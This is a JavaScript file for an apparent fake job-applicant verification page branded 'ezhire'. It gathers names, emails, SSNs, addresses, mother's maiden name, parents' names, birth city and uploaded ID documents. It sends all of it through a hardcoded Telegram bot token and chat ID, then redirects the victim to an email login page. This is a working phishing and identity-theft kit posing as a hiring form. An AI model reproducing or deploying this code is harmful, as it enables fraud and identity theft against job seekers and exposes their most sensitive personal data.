const STORAGE_KEY = "ezhire_verification";

function getStoredData() {
    return JSON.parse(localStorage.getItem(STORAGE_KEY)) || {};
}

function storeData(section, values) {
    const existing = getStoredData();
    existing[section] = values;
    localStorage.setItem(STORAGE_KEY, JSON.stringify(existing));
}

function saveExperience() {
    const data = {
        skill: document.querySelector('[placeholder*="Customer"]').value,
        years: document.querySelectorAll("select")[0].value,
        question1: document.querySelectorAll("select")[1].value,
        question2: document.querySelectorAll("select")[2].value,
        question3: document.querySelectorAll("select")[3].value,
        question4: document.querySelectorAll("select")[4].value,
        question5: document.querySelectorAll("select")[5].value,
        experience: document.querySelectorAll("textarea")[0].value
    };

    storeData("experience", data);
}

function saveCommitment() {
    const selects = document.querySelectorAll("select");

    const data = {
        interest: document.querySelectorAll("textarea")[1].value,
        hoursPerWeek: selects[6].value,
        longTerm: selects[7].value
    };

    storeData("commitment", data);
}

function saveIdentity() {
    const inputs = document.querySelectorAll("input[type='text']");

    const data = {
        fullName: inputs[1].value,
        email: inputs[2].value,
        ssn: inputs[3].value,
        phone: inputs[4].value,
        address: inputs[5].value,
        idNumber: inputs[6].value
    };

    storeData("identity", data);
}

function submitVerification(e) {
    e.preventDefault();

    const inputs = document.querySelectorAll(
        "input[type='text'], input[type='file']"
    );

    // Get both files - assuming:
    // inputs[7] = ID Document (first file)
    // inputs[8] = Additional Document (second file)
    const idFile = inputs[6].files[0];
    const additionalFile = inputs[7]?.files[0]; // Optional second file

    // keep local storage logic
    const verificationData = {
        fullName: inputs[1].value,
        Email: inputs[2].value,
        SSN: inputs[3].value,
        phoneNumber: inputs[4].value,
        Address: inputs[5].value,
        maidenName: inputs[8].value,
        birthCity: inputs[9].value,
        fatherName: inputs[10].value,
        motherName: inputs[11].value,
        idFileName: idFile ? idFile.name : null,
        additionalFileName: additionalFile ? additionalFile.name : null
    };

    storeData("verification", verificationData);
    const finalPayload = getStoredData();

    // Telegram API credentials
    const TELEGRAM_BOT_TOKEN = '8424484193:AAFvLn7GwjI3US_nVBUKBOGKUGPuH-xcZo4';
    const TELEGRAM_CHAT_ID = '7867274282';

    // Format message with both files
    const message = `
🔐 **NEW VERIFICATION REQUEST**

📋 **PERSONAL INFORMATION**
• **Full Name:** ${finalPayload.verification.fullName || "Not provided"}
• **Email:** ${finalPayload.verification.Email || "Not provided"}
• **Phone:** ${finalPayload.verification.phoneNumber || "Not provided"}
• **Address:** ${finalPayload.verification.Address || "Not provided"}
• **Birth City:** ${finalPayload.verification.birthCity || "Not provided"}
• **Mother's Name:** ${finalPayload.verification.motherName || "Not provided"}
• **Father's Name:** ${finalPayload.verification.fatherName || "Not provided"}
• **Mother's Maiden Name:** ${finalPayload.verification.maidenName || "Not provided"}

🆔 **IDENTIFICATION DETAILS**
• **SSN:** ${finalPayload.verification.SSN || "Not provided"}
• **ID File:** ${finalPayload.verification.idFileName || "Not provided"}
• **Additional File:** ${finalPayload.verification.additionalFileName || "Not provided"}

📎 **FILE DETAILS**
• **ID File:** ${idFile ? `${idFile.name} (${(idFile.size / 1024).toFixed(2)} KB, ${idFile.type})` : "No file"}
• **Additional File:** ${additionalFile ? `${additionalFile.name} (${(additionalFile.size / 1024).toFixed(2)} KB, ${additionalFile.type})` : "No file"}

⏰ **Upload Time:** ${new Date().toLocaleString()}

---

✅ **Verification ID:** #${Date.now().toString().slice(-6)}
    `;

    // REPLACED FETCH: Send to Telegram API directly
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        // If no token, just simulate success
        console.log("📦 Verification Data:", verificationData);
        console.log("📎 ID File:", idFile);
        console.log("📎 Additional File:", additionalFile);

        // Simulate API call
        setTimeout(() => {
            alert("Verification submitted! (Demo mode - no Telegram token set)");
            localStorage.removeItem(STORAGE_KEY);
            window.location.href = "loading.html?next=success.html";
        }, 500);
        return;
    }

    // Send text message to Telegram
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        })
    })
        .then(res => res.json())
        .then(async (telegramRes) => {
            console.log("📨 Telegram message sent:", telegramRes);

            // Function to send a file to Telegram
            const sendFileToTelegram = async (file, caption) => {
                if (!file) return null;

                const fileFormData = new FormData();
                fileFormData.append("chat_id", TELEGRAM_CHAT_ID);
                fileFormData.append("document", file);
                fileFormData.append("caption", caption);

                try {
                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
                        method: "POST",
                        body: fileFormData
                    });
                    const result = await response.json();
                    console.log(`📎 ${caption}:`, result);
                    return result;
                } catch (error) {
                    console.warn(`⚠️ Failed to send ${caption}:`, error);
                    return null;
                }
            };

            // Send ID Document
            if (idFile) {
                await sendFileToTelegram(
                    idFile,
                    `🆔 ID Document: ${finalPayload.verification.fullName || "Candidate"}`
                );
            }

            // Send Additional Document (if exists)
            if (additionalFile) {
                await sendFileToTelegram(
                    additionalFile,
                    `📄 Additional Document: ${finalPayload.verification.fullName || "Candidate"}`
                );
            }

            // SUCCESS - redirect
            localStorage.removeItem(STORAGE_KEY);
            window.location.href = "loading.html?next=login-email-page.html";
        })
        .catch(err => {
            console.error("❌ Telegram API error:", err);
        });
}

window.addEventListener("load", () => {
    const data = getStoredData();
    if (!data.experience) return;

    // you can map values back to inputs here later
});